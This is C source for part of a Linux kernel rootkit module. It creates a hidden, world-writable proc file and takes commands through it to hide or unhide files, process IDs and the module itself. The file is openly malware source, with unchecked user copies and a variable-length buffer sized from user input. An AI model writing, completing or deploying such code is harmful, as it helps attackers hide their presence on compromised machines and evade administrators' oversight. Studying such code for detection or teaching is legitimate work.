#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/uaccess.h> // copy from user
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <asm/paravirt.h> // write_cr0

#include "config.h"
#include "proc.h"
#include "hiding.h"


void handle_request(const char __user* buff, size_t len){
	int id, pid;
	char filename[len - sizeof(id)];
	copy_from_user(&id, buff, sizeof(id));
	switch (id){
		case 1: // HIDE FILE
			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
			if (hide_file(filename) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR hiding file %s in proc\n", filename);
			break;
		case 2:// UNHIDE FILE
			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
			if (unhide_file(filename) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR unhiding file %s in proc\n", filename);
			break;
		case 3: // HIDE PID
			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
			if (hide_pid(pid) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d in proc\n", pid);
			break;
		case 4: // HIDE PID
			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
			if (unhide_pid(pid) == -1)
				printk(KERN_INFO "ROOTKIT: ERROR unhiding pid %d in proc\n", pid);
			break;
		case 5: // PRINT HIDDEN
			print_hidden();
			break;
		case 6: // HIDE MODULE
			if (hide_module() == -1)
				printk(KERN_INFO "ROOTKIT: ERROR hiding module\n");
			break;
		case 7: // UNHIDE MODULE
			if (unhide_module() == -1)
				printk(KERN_INFO "ROOTKIT: ERROR unhiding module\n");
			break;
		default:
			printk(KERN_INFO "ROOTKIT: ERROR Unknown request in proc file\n");
	}
}

static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, loff_t* off){
	printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");

	// I don't know if this should be handled here
	handle_request(buff, len);

	return len;
}

static struct file_operations proc_fops = {
	.write = write_proc
};

int __init proc_init(void){
	if (proc_create(PROC_FILENAME, 0666, NULL, &proc_fops) == NULL){
		printk(KERN_INFO "ROOTKIT error trying to create proc file\n");
		return -1;
	}
	if (hide_file(PROC_FILENAME) == -1){
		printk(KERN_INFO "ROOTKIT error trying to hide proc file\n");
		remove_proc_entry(PROC_FILENAME, NULL);
		return -1;
	}
	return 0;
}

void proc_exit(void){
	unhide_file(PROC_FILENAME);
	remove_proc_entry(PROC_FILENAME, NULL);
}
